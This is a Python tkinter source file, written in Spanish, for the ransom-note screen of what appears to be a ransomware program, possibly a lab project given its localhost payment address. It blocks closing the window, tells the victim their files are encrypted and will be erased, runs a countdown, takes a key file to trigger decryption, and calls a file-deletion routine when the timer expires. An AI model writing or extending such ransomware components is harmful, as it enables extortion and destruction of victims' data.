import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
from datetime import datetime, timedelta
from handler import Handler

class Main:
    def __init__(self, root, handler: Handler):
        self.root = root
        self.handler = handler # Objeto con varias funciones

        # Tkinter
        root.resizable(False, False)
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        root.title("Su computadora ha sido comprometida")
        root.geometry("1040x720")

        self.frame1 = tk.Frame(root, bg="#ff3300", relief="groove", bd=2)
        self.frame1.place(x=0, y=0, width=1040, height=720)

        self.label1 = tk.Label(self.frame1, text="SU COMPUTADORA HA SIDO COMPROMETIDA", fg="#ffffff", bg="#ff3300", font=("Helvetica", 30), wraplength=750, justify="center")
        self.label1.place(x=150, y=30, width=750, height=90)

        self.label2 = tk.Label(self.frame1, text="Hemos cifrado y secuestrado todos los datos de su computadora y los vamos a borrar en:", fg="#FFFFFF", bg="#ff3300",font=("Helvetica", 18), wraplength=640, justify="center")
        self.label2.place(x=200, y=130, width=640, height=50)

        self.frame2 = tk.Frame(self.frame1, bg="#ffffff", relief="groove", bd=2)
        self.frame2.place(x=40, y=250, width=960, height=430)

        self.label3 = tk.Label(self.frame1, text="12:00:00", fg="#ffff00", bg="#ff3300", font=("Helvetica", 25), wraplength=180, justify="center")
        self.label3.place(x=430, y=200, width=180, height=40)

        self.label4 = tk.Label(self.frame2, text="Sus datos han sido cifrados con un algoritmo de grado militar por lo que no hay ninguna manera de poder descifrarlos. La una forma de recuperar sus datos es comprando una llave de descifrado de datos en la siguiente pagina web:", bg="#ffffff",font=("Helvetica", 15), wraplength=300, justify="center")
        self.label4.place(x=80, y=45, width=300, height=200)

        self.label5 = tk.Label(self.frame2, text="http://127.0.0.1:8000", bg="#ffffff", font=("Helvetica", 15), wraplength=210, justify="center")
        self.label5.place(x=125, y=270, width=210, height=30)

        self.label6 = tk.Label(self.frame2, text="Una vez que haya realizado el pago entonces ingrese el archivo con la llave para desbloquear su computadora. En caso de no realizar el pago a tiempo los datos de su computadora serán: ELIMINADOS sin forma de poder recuperarlos", bg="#ffffff", font=("Helvetica", 15), wraplength=300, justify="center")
        self.label6.place(x=590, y=35, width=300, height=210)

        self.entry1 = tk.Entry(self.frame2)
        self.entry1.place(x=440, y=346, width=280, height=30)

        self.button_browse = tk.Button(self.frame2, text="Examinar...", command=self.on_browse, bg="#ffea00")
        self.button_browse.place(x=720, y=345, width=85, height=32)

        self.button1 = tk.Button(self.frame2, text="Enviar", command=self.on_button1, bg="#ffea00")
        self.button1.place(x=820, y=345, width=96, height=32)

        self.label17 = tk.Label(self.frame2, text="Llave de desbloqueo: ", bg="#ffffff", font=("Helvetica", 12), wraplength=160, justify="center")
        self.label17.place(x=280, y=348, width=160, height=30)

        self.actualizar_timer()

    def on_browse(self):
      ruta = filedialog.askopenfilename(
        title="Selecciona la llave",
        filetypes=[
          ("Archivos de llave", "*.pem *.key *.pub *.bin"),
          ("Todos los archivos", "*.*"),
        ],
      )
      if ruta:
        self.entry1.delete(0, tk.END)
        self.entry1.insert(0, ruta)

    def on_button1(self):
      ruta = self.entry1.get()
      self.handler.descifrar_llave(ruta)
      self.handler.descifrar_directorios()
      self.root.destroy()
      pass

    def actualizar_timer(self):
      ahora = datetime.now()
      restante = self.handler.date_delete - ahora

      if restante.total_seconds() > 0:
        segundos_totales = int(restante.total_seconds())
        horas, rem = divmod(segundos_totales, 3600)
        minutos, segundos = divmod(rem, 60)

        # Actualizar la UI
        self.label3.config(text=f"{horas:02d}:{minutos:02d}:{segundos:02d}")
        
        # Repetir cada 1000 ms (1 segundo)
        self.root.after(1000, self.actualizar_timer)
      else:
        # El tiempo se acabó
        self.label3.config(text="00:00:00")
        self.handler.eliminar_archivos()